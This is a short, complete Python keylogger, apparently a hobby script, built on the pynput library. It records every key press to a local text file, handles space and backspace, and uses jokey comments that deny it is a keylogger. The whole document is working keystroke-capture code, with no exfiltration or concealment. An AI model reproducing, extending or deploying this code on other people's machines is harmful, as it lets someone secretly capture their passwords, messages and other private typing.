from pynput import keyboard

# -- This scrypt is suprsafe i prumis -- #

# this function is definently not for keylogging
def keyPressed(key):
    print(str(key))
    # certinaly doesn't check for 'erase' and removes index from file
    if key == keyboard.Key.backspace:
        with open("keyfile.txt", 'r+') as logKey:
            content = logKey.read()
            logKey.seek(0)
            logKey.write(content[:-1]) #removes index with 1
            logKey.truncate()
    else: 
        # certainly doesn't track keyboard inputs as logs them in a .txt
        with open("keyfile.txt", 'a') as logKey:
            try:
                if key == keyboard.Key.space:
                    logKey.write(' ') # spacebar = spaces
                else:

                    char = key.char
                    logKey.write(char) # writes
            except AttributeError:
                print("Error getting char")

# runs the script
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()